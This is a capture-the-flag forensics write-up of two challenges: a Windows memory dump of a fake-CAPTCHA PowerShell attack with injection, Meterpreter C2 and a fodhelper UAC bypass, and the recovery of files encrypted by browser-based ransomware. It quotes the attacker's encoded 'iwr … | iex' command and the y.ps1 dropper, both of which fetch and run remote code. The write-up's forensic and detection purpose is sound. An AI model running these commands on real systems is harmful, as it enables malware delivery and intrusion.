# WannaGame Championship 2025 Writeup



## Forensics
### Hide and Seek
![Challenge Description](images/hide_and_seek_chal_1.png)



## Table of Contents
- [Challenge Overview](#challenge-overview)
- [Tools and Resources](#tools-and-resources)
- [Initial Analysis](#initial-analysis)
- [Attack Timeline](#attack-timeline)
- [Detailed Solutions](#detailed-solutions)
- [Malware Analysis](#malware-analysis)
- [Conclusion](#conclusion)

---

## Challenge Overview

This challenge involved analyzing a Windows memory dump (`memdump.raw`) to investigate a sophisticated multi-stage attack involving:
- Phishing via fake CAPTCHA (ClickFix technique)
- PowerShell-based payload delivery
- Process injection
- UAC bypass using fodhelper.exe
- Command and Control (C2) communication

The challenge required answering 8 forensics questions to obtain the flag.

---

## Tools and Resources

### Primary Tools
- **Volatility 3 Framework (v2.26.2)** - Memory forensics analysis
- **VolTool / VolGraph.py** - Process Tree Visuslization 
- **Claude Code CLI with Sonnet 4.5** - AI-assisted analysis and automation
- **strings** - Extract readable strings from binaries
- **xxd** - Hex dump utility
- **grep/awk/sed** - Text processing

### Additional Resources
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [VirusTotal](https://www.virustotal.com/) - Malware analysis
- [Eric Zimmerman's Tools](https://ericzimmerman.github.io/#!index.md) 

---

## Initial Analysis

### Memory Dump Verification

First, we verified the integrity of the memory dump:

```bash
md5sum memdump.raw
# Output: 7d86ddab63d20a1950500597c5525640
```

### Volatility Profile Detection

```bash
vol -f memdump.raw windows.info
```

This confirmed we were analyzing a **Windows 10** system with user `imnoob`.

### Process Tree Generation

```bash
vol -f memdump.raw windows.pstree > vol_out/pstree_full.txt
```
### Process Tree Visualization
```bash
VolGraph.py -p memdump.raw -o "/vol_out"
```

Key processes identified:
- **explorer.exe (PID 6500)** - Parent of malicious PowerShell
- **powershell.exe (PID 3000)** - Initial payload execution
- **verify.exe (PID 5656)** - Malicious executable
- **powershell.exe (PID 5888)** - UAC bypass script
- **fodhelper.exe (PID 2964)** - UAC bypass mechanism

---

## Attack Timeline

### Complete Attack Chain

| Time (UTC) | Event | Process | Description |
|------------|-------|---------|-------------|
| 12:43:38 | Initial Access | firefox.exe (2412) | User browsing, accessed malicious site |
| 12:44:57 | User Execution | N/A | User copied malicious PowerShell command to Run dialog |
| 12:45:06 | Process Start | explorer.exe (6500) | Explorer spawned as parent process |
| 12:45:19 | Payload Download | powershell.exe (3000) | Downloaded and executed y.ps1 script |
| 12:45:20 | Malware Execution | verify.exe (5656) | Extracted from update.zip, executed |
| 12:45:20 | Process Injection | verify.exe → explorer.exe | Injected shellcode into explorer.exe |
| 12:45:38 | Lateral Movement | cmd.exe (6056) | Command prompt spawned |
| 12:45:52 | Privilege Escalation | powershell.exe (5888) | UAC bypass script initiated |
| 12:46:39 | UAC Bypass | fodhelper.exe (2964) | Fodhelper executed for privilege escalation |
| 12:47:30 | Persistence | MRCv120.exe (4412) | Additional suspicious executable on Desktop |

### Network Activity Timeline

| Time (UTC) | Source | Destination | Description |
|------------|--------|-------------|-------------|
| 12:45:19 | 192.168.1.10:49xxx | 192.168.1.11:7331 | Downloaded y.ps1 script |
| 12:45:19 | 192.168.1.10:49xxx | 192.168.1.11:7331 | Downloaded update.zip |
| 12:45:20+ | 192.168.1.10:49806 | 192.168.1.11:64421 | C2 connection established |

---

## Detailed Solutions

### Question 1: MITRE ID for Initial Access

**Question:** What is the MITRE ID for initial access? (TXXXX.XXX)

**Solution Process:**

1. Analyzed the attack vector - fake CAPTCHA prompting user to run PowerShell
2. Researched MITRE ATT&CK for phishing techniques:

```bash
# Web research identified T1566.002 - Spearphishing Link
```

3. This matches the ClickFix technique where users click a link leading to a fake CAPTCHA page

**Answer:** `T1566.002`

**MITRE Technique:** [T1566.002 - Phishing: Spearphishing Link](https://attack.mitre.org/techniques/T1566/002/)

---

### Question 2: Link Accessed by Victim

**Question:** What link did the victim access? (ASCII)

**Solution Process:**

1. Examined Firefox browser history in memory:

```bash
vol -f memdump.raw windows.filescan | grep -i "firefox.*cache"
```

2. Searched PowerShell process memory for HTTP references:

```bash
strings pid.3000.dmp | grep -i "http://192.168"
```
3. Found reference to captcha.html:

```bash
strings pid.3000.dmp | grep -B5 -A5 "captcha"
# Output: http://192.168.1.11:7331/captcha.html
```
![captcha](images/hide_and_seek_captcha.png)
**Answer:** `http://192.168.1.11:7331/captcha.html`

**Analysis:** This was the fake CAPTCHA page that instructed the user to copy and paste a PowerShell command.

---

### Question 3: Malicious Command Executed

**Question:** What command does the attacker trick the victim into executing? (ASCII)

**Solution Process:**

1. Examined Windows Run dialog history (RunMRU):


```bash
vol -f memdump.raw windows.registry.printkey \
  --key "Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```
![powershell](images/hide_and_seek_powershell.png)
2. Found base64-encoded PowerShell command:

```
powershell.exe -eC aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADoANwAzADMAMQAvAHkALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA
```

3. Decoded the base64 to verify:

```bash
echo 'aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADoANwAzADMAMQAvAHkALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA' \
  | base64 -d | iconv -f UTF-16LE -t ASCII
# Output: iwr http://192.168.1.11:7331/y.ps1 -UseBasicParsing | iex
```

**Answer:** `powershell.exe -eC aQB3AHIAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAxADoANwAzADMAMQAvAHkALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAAaQBlAHgA`

**Analysis:**
- `-eC` = EncodedCommand parameter
- UTF-16LE encoded base64
- Downloads y.ps1 and executes it in memory via `iex` (Invoke-Expression)

---

### Question 4: Script Download Link and Storage

**Question:** What link to run the script and what file name is it stored in? ` (http://example.com//script.ext_file.rar) `

Based on what we found in our previous answer, by looking at the base64 encoded powershell command, we know that the name of the script is `y.ps1` from what we just saw `iwr http://192.168.1.11:7331/y.ps1 -UseBasicParsing | iex`

**Solution Process:**

1. Examined PowerShell PID 3000 memory dump:

```bash
vol -f memdump.raw windows.memmap --dump --pid 3000
strings pid.3000.dmp | grep -B5 -A5 "kqwer"
```

2. Found the y.ps1 script contents:

```powershell
$webClient = New-Object System.Net.webClient
$url1 = "http://192.168.1.11:7331/update.zip"
$zipPath1 = "$env:TEMP\kqwer.zip"
$webClient.DownloadFile($url1, $zipPath1)
$extractPath1 = "$env:TEMP\file"
Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
Start-Process -FilePath $env:TEMP\file\verify.exe
```

3. Identified that y.ps1 was downloaded and saved update.zip as kqwer.zip


![script-zip](images/hide_and_seek_question_4.png)
**Answer:** `http://192.168.1.11:7331/y.ps1_kqwer.zip`

**Analysis:** The script downloads from one URL `(y.ps1)` but saves the subsequent download `(update.zip)` with a different name `(kqwer.zip)` to evade detection.

---

### Question 5: MITRE Technique and Registry Storage

**Question:** What is the MITRE ID of this technique and where does this command store in the registry? (TXXXX_Hive\key)

**Solution Process:**

1. Analyzed the attack technique - user manually copied and pasted malicious command
2. Researched "fake CAPTCHA" and "copy paste" attacks:

```bash
# Found T1204.004 - User Execution: Malicious Copy and Paste
```

3. Verified registry storage location:

```bash
vol -f memdump.raw windows.registry.printkey \
  --key "Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```

Output showed the PowerShell command stored in RunMRU registry key.

**Answer:** `T1204_HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`

**MITRE Technique:** [T1204.004 - User Execution: Malicious Copy and Paste](https://attack.mitre.org/techniques/T1204/004/)

**Analysis:** The ClickFix/CAPTCHA technique tricks users into running malicious commands manually, which gets logged in the RunMRU registry key.

---

### Question 6: Suspicious File Location and Injection Target

**Question:** Where was the suspicious file installed and what previous process and ID called this suspicious application? Example: `(C:\path\file\A_processA.ext_1234)`

For this question, our script `VolGraph.py` is very helpful to visualize the process tree 
![pstree](images/hide_and_seek_pstree_2.png)
**Solution Process:**

1. Located verify.exe in process tree:

```bash
vol -f memdump.raw windows.pstree | grep verify
# Output: 5656  3000  verify.exe  \Device\HarddiskVolume2\Users\imnoob\AppData\Local\Temp\file\verify.exe
```
This translates to `C:\Users\imnoob\AppData\Local\Temp\file`

2. Analyzed verify.exe with strings:

```bash
strings dumped/file.0xb9f78070.0xbe1e9de0.ImageSectionObject.verify.exe.img 
# explorer.exe
# Decrypting shellcode
# Handle obtained: %p
# kernel32.dll
# LoadLibraryA
# Injecting...
# Check your meterpreter :D
```
![strings](images/hide_and_seek_strings.png)]

3. Identified injection target - explorer.exe (PID 6500)

**Answer:** `C:\Users\imnoob\AppData\Local\Temp\file_explorer.exe_6500`

**Analysis:**
- verify.exe was extracted to `%TEMP%\file\`
- It injected malicious shellcode into explorer.exe (PID 6500)
- The path excludes the malicious file itself, focusing on the directory and injection target

---

### Question 7: C2 IP and Port

**Question:** What is IP and PORT of attacker in injected shellcode? (IP:PORT)

**Solution Process:**

1. Analyzed network connections:

```bash
vol -f memdump.raw windows.netscan | grep ESTABLISHED | grep "192.168.1.11"
```

2. Found suspicious connection:

```
0xac042c18  TCPv4  192.168.1.10  49806  192.168.1.11  64421  ESTABLISHED
```

3. Verified this matches the attack infrastructure (192.168.1.11 was the download server)

![ip_port](images/hide_and_seek_IP_PORT.png)

**Answer:** `192.168.1.11:64421`

**Analysis:**
- Victim IP: 192.168.1.10
- Attacker C2: 192.168.1.11:64421
- Connection established after verify.exe injected into explorer.exe
- This is the Meterpreter reverse shell connection

---

### Question 8: UAC Bypass Process

**Question:** What process was used to bypass UAC and PPID? (ProcessA.ext_1234)


**Solution Process:**

1. Searched for UAC bypass indicators in process tree:

```bash
vol -f memdump.raw windows.pstree | grep -i "fodhelper"
```

2. Found fodhelper.exe execution:

```
2964  5888  fodhelper.exe
```

3. Examined registry key used for UAC bypass:

```bash
vol -f memdump.raw windows.registry.printkey \
  --key "Software\Classes\ms-settings\shell\open\command"
```
Again here our helpful visualization volatility3 helper script [VolGraph.py](https://github.com/tr4c3datr4il/VolTool/blob/main/VolGraph.py) is helpful for visualizing the process tree

![volgraph](images/hide_and_seek_volgraph.png)
**Answer:** `fodhelper.exe_5888`

**Analysis:**
- **Process:** fodhelper.exe (PID 2964)
- **Parent Process:** powershell.exe (PID 5888)
- **MITRE Technique:** [T1548.002 - Abuse Elevation Control Mechanism: Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)
- **Method:** Hijacking ms-settings handler via registry manipulation

---

## Malware Analysis

### verify.exe Deep Dive

**File Information:**
- **SHA256:** `9c5a91e95d29ea69d17fa9cc99e1f5635762c3b9d693e04dd65cd89e549b8751`
- **Type:** PE32 executable (console) Intel 80386
- **Location:** `C:\Users\imnoob\AppData\Local\Temp\file\verify.exe`

**Behavior Analysis:**

```bash
# Extract strings from verify.exe
strings verify.exe.img | grep -i "check\|inject\|decrypt"
```

Key strings found:
- `Check your meterpreter :D` - Indicates Meterpreter payload
- `Decrypting shellcode` - Shellcode decryption routine
- `Injecting...` - Process injection
- `explorer.exe` - Target process
- `Handle obtained: %p` - Debug output for process handle

**VirusTotal Results:**

Uploaded y.ps1 showed registry manipulation:
```
HKEY_USERS\S-1-5-21-...\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.exe\OpenWithProgids
```

### Attack Kill Chain

```
1. Initial Compromise
   └─> User visits http://192.168.1.11:7331/captcha.html (Phishing Link)
       └─> Fake CAPTCHA displays PowerShell command (Social Engineering)

2. Execution
   └─> User copies command to Run dialog (T1204.004)
       └─> PowerShell downloads y.ps1 (T1059.001)
           └─> y.ps1 downloads update.zip → kqwer.zip (T1105)
               └─> Extracts verify.exe (T1027)

3. Defense Evasion & Persistence
   └─> verify.exe injects into explorer.exe (T1055)
       └─> Spawns PowerShell for UAC bypass (T1059.001)
           └─> Manipulates registry for fodhelper.exe (T1548.002)
               └─> fodhelper.exe elevates privileges

4. Command & Control
   └─> Injected shellcode establishes C2 (T1071)
       └─> Connects to 192.168.1.11:64421
           └─> Meterpreter session active
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Usage |
|--------|-----------|----|----|
| Initial Access | Phishing: Spearphishing Link | T1566.002 | Fake CAPTCHA page |
| Execution | User Execution: Malicious Copy and Paste | T1204.004 | User manually runs command |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell payload delivery |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64 encoded commands |
| Privilege Escalation | Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 | Fodhelper UAC bypass |
| Defense Evasion | Process Injection | T1055 | Shellcode injection into explorer.exe |
| Command and Control | Application Layer Protocol | T1071 | Meterpreter C2 communication |
| Command and Control | Ingress Tool Transfer | T1105 | Downloaded malicious scripts/payloads |

---

## Forensic Artifacts Summary

### Registry Artifacts

1. **RunMRU** - `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
   - Stored the PowerShell execution command
   - Timestamp: 2025-12-05 12:44:57 UTC

2. **UAC Bypass** - `HKCU\Software\Classes\ms-settings\Shell\Open\command`
   - Modified for fodhelper.exe exploitation
   - Used to execute elevated PowerShell

3. **UserAssist** - Execution tracking
   - PowerShell.exe executed 2 times
   - Last execution: 2025-12-05 12:45:19 UTC

### File System Artifacts

```
C:\Users\imnoob\AppData\Local\Temp\
├── kqwer.zip (Downloaded as update.zip)
└── file\
    └── verify.exe (Extracted from kqwer.zip)

C:\Users\imnoob\Desktop\
└── MRCv120.exe (Additional suspicious executable)
```

### Network Artifacts

- **C2 Server:** 192.168.1.11
- **Download Port:** 7331 (HTTP)
- **C2 Port:** 64421 (Meterpreter)
- **Victim IP:** 192.168.1.10


---

## Key Takeaways

### Detection Opportunities

1. **Behavioral Indicators:**
   - PowerShell with `-EncodedCommand` from explorer.exe parent
   - Unusual network connections from explorer.exe
   - fodhelper.exe spawned by PowerShell (not by legitimate GUI actions)
   - Registry modifications under `ms-settings` handler

2. **Network Indicators:**
   - HTTP downloads from non-standard ports (7331)
   - Persistent connection to unusual high port (64421)
   - Internal IP addressing suggesting lateral movement capability

3. **File System Indicators:**
   - Executables in %TEMP% directories
   - ZIP files with obfuscated names (kqwer.zip vs update.zip)

### Prevention Recommendations

1. **User Awareness:**
   - Train users to recognize fake CAPTCHA/ClickFix attacks
   - Never copy-paste commands from websites
   - Verify legitimacy of unexpected technical instructions

2. **Technical Controls:**
   - Application whitelisting for PowerShell execution
   - Monitor registry changes to UAC bypass keys
   - Network segmentation and egress filtering
   - EDR solution to detect process injection

3. **Detection Rules:**
   ```yaml
   # Detect fodhelper UAC bypass
   - process_name: fodhelper.exe
     parent_process: powershell.exe
     action: alert

   # Detect encoded PowerShell from Run dialog
   - process_name: powershell.exe
     command_line: contains "-eC" or "-EncodedCommand"
     parent_process: explorer.exe
     action: alert

   # Detect suspicious ZIP extraction to TEMP
   - file_path: "*\\AppData\\Local\\Temp\\*"
     extension: ".exe"
     parent_process: powershell.exe
     action: alert
   ```

---

## Conclusion

This challenge demonstrated a realistic multi-stage attack chain combining:
- **Social engineering** (fake CAPTCHA)
- **Living-off-the-land** techniques (PowerShell, fodhelper)
- **Advanced evasion** (process injection, UAC bypass)
- **Post-exploitation** (C2 communication)

The investigation required comprehensive memory forensics skills, MITRE ATT&CK framework knowledge, and the ability to correlate artifacts across processes, registry, and network connections.

**Final Flag:** `W1{c0nGRAtu1at10N5-9ou_F1N4IIY_FOUnd-m3!11fbad}`

---

![Solution Screenshot](images/hide_and_seek_solve.png)

---

## Where is the Malware?

![where_is_the_malware_chal](images/where_is_the_malware_chal.png)



## Step-by-step guide

1. **Survey the victim profile and ransom note**
   ```bash
   cd /mnt/c/ctf/_W1/forensics/where_is_the_malware
   cat C/Users/alex/Documents/for_meeting/ransom.txt
   ```
   ![ransom](images/where_is_the_malware_ransom_note.png)
   This confirmed Alex’s documents were encrypted and listed victim ID `63c4bc5d-6e89-43c3-b618-8d79351f6573`.

2. **Review suspicious downloads and execution traces**
   ```bash
   ls -al C/Users/alex/Downloads
   ```

3. **Locate the malicious JavaScript payload**
   The user’s Chrome cache still held the worker that performed encryption. Searching the cache for AES usage revealed it:
   ```bash
   rg -a "AES" -n C/Users/alex/AppData/Local/Google/Chrome/User\ Data/Default/Cache/Cache_Data/f_0004ab
   ```
   
   ##### *Or just look through it manually*
   - Key excerpts from that cache file:

   ```java
   const A = "97640d7edecc04adda142fabe9760513faca90cebce7dd32f4ac6f276e60b509";
   const B = "94b4c8343e07d37ce38a87403029414e05c397dffcbfb7d1302a69a089cc79ef";
   key = hexXor(A, B);               // derives the AES-256 key
   const result = await aes.encrypt(data);
   const combined = tag + ciphertext + iv; // order written to disk
   ```
   This clarified both the key derivation (XOR of two 32‑byte constants) and the ciphertext layout: `[16-byte tag][ciphertext][16-byte nonce]`.

4. **Derive the AES-256-GCM key**
   ```bash
   python3 - <<'PY'
   from binascii import unhexlify
   a = unhexlify("97640d7edecc04adda142fabe9760513faca90cebce7dd32f4ac6f276e60b509")
   b = unhexlify("94b4c8343e07d37ce38a87403029414e05c397dffcbfb7d1302a69a089cc79ef")
   key = bytes(x ^ y for x, y in zip(a, b))
   print(key.hex())  # 03d0c54ae0cbd7d1399ea8ebd95f445dff09071140586ae3c4860687e7accce6
   PY
   ```

5. **Decrypt the victim’s files**
   See decryption helper script in `files/where_is_the_malware_decrypt.py`. 
   
   It consumes one encrypted file at a time, assumes the `[tag][ciphertext][iv]` layout, and uses the recovered key.
   Example usage:
   ```bash
   mkdir -p tmp/recovered
   python3 /mnt/c/ctf/_W1/writeup/files/where_is_the_malware_decrypt.py \
       C/Users/alex/Documents/for_meeting/Bulbasaur.jpg \
       tmp/recovered/Bulbasaur.jpg
   
   ```
   ![decrypt](images/where_is_the_malware_decrypt.png)
   I repeated for each file inside `Documents/for_meeting/` 

6. **Validate and extract the flag**
   
   Once we have all the files for the `for_meeting` folder decrypted.  We simply look through our decrypted files in `tmp/recovered/`

   ![for_meeting](images/where_is_the_malware_for_meeting.png)

  

Looking through our decrypted files, we come across this beautiful image
`Bulbasaur.jpg`

![Bulbasaur](images/Bulbasaur.jpg)

### Flag
` W1{hAv3_u_3v3r_kNowN_R4n5omWar3_oN_Brow5eR_???!!!_8QZeXvQjgGE} `
## Artifacts
- `files/where_is_the_malware_decrypt.py` – Python tool to decrypt encrypted files in this drive.

## Notes
I used GPT 5.1 Codex CLI to help me solve this challenge.  In all honesty, I gave the challenge to the LLM and was looking through it manually.  I paused and looked through all of the recovered files and realized that the flag was already there. Fully decrypted.

This got me First Blood on the challenge.  
![first_blood](images/where_is_the_malware_first_blood.png)

Thank you to [WannaGame Championship 2025](https://discord.gg/XcJ5sbpnR7) for hosting a fun and challenging event and to my team [Lil L3ak](https://www.linkedin.com/company/lil-l3ak/posts/?feedView=all) for supporting me and all of my teammates 

I'm currently open to new opportunities.  If you work in cyber and you're looking to grow your team, I'd love to talk.

`Let's connect.`

- [LinkedIn](https://www.linkedin.com/in/smosillo/)
- [X](http://x.com/t4mpr)
- [GitHub](http://github.com/t4mpr)
